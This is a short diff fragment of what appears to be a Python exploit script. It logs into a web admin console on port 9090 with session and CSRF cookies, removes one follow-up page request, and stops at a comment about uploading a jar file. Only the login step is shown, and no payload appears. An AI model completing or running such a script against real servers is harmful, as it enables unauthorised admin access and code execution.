@@ -25,7 +25,6 @@ sess = requests.Session()
 r = sess.post(login_url, data=data, headers={"Content-Type":"application/x-www-form-urlencoded","Cookie":f"JSESSIONID={jsessionid}; csrf={csrf}"})
 cook = sess.cookies.get_dict()
 csrf2 = cook['csrf']
-r = sess.get(f'http://{sys.argv[2]}:9090/index.jsp', headers={"Cookie":f"JSESSIONID={jsessionid}; csrf={csrf2}"})
 print('[+] Logged in Admin Console')
 
 #upload jar file
